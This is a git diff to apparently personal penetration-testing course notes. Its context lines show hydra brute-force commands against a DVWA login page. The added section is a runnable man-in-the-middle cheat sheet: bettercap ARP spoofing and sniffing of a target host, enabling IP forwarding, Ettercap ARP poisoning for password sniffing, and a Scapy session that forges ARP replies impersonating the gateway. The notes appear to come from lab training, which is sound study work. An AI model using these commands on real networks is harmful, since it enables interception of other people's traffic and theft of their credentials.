@@ -124,3 +124,66 @@ hydra 192.168.1.9 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS
 hydra 192.168.1.9 http-get-form "/dvwa/valnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: security=low; PHPSESSID=de86e1e9f8e1f54dfed367fd82665aaa" -L usernames.txt -P passwords.txt
 ```
 
+## Section 15: Man In The Middle - MITM
+* Bettercap ARP Spoofing
+```bash
+apt-get install bettercap
+bettercap
+>> help net.probe
+>> net.probe on
+>> help arp.spoof
+>> set arp.spoof.fullduplex true
+>> set arp.spoof.targets 192.168.1.7
+>> help net.sniff
+>> set net.sniff.local true
+>> arp.spoof on
+>> net.sniff on
+>> exit
+
+# sniff.cap store all above commands
+bettercap -iface eth0 -caplet sniff.cap
+```
+* Check packet forwarding
+```bash
+cat /proc/sys/net/ipv4/ip_forward
+
+# enable packet forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+* Ettercap (Password Sniffing)
+```bash
+ettercap -G
+
+# discover host on the network
+# Host List
+# Add to Target1
+# MITM Menu > ARP poisoning
+```
+* check ARP cache
+```bash
+arp -a
+```
+* Poisoning Targets ARP Cache With Scapy
+```bash
+sudo scapy
+>>> ls(Ether)
+>>> ls(ARP)
+>>> ls(TCP)
+>>> ls(Ether)
+>>> boardcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+>>> boardcast.show()
+>>> ls(ARP)
+>>> arp_layer = ARP(pdst='192.168.1.7')
+>>> arp_layer.show()
+>>> entire_packet = boardcast/arp_layer
+>>> entire_packet.show()
+>>> answer = srp(entire_packet, timeout=2, verbose=True)[0]
+>>> print(answer)
+>>> print(answer[0])
+>>> print(answer[0][1].hwsrc)
+>>> target_mac_address = answer[0][1].hwsrc
+>>> packet = ARP(op=2, hwdst=target_mac_address, pdst='192.168.1.7', psrc='192.168.1.1')
+>>> packet.show()
+>>> send(packet, verbose=False)
+```
+
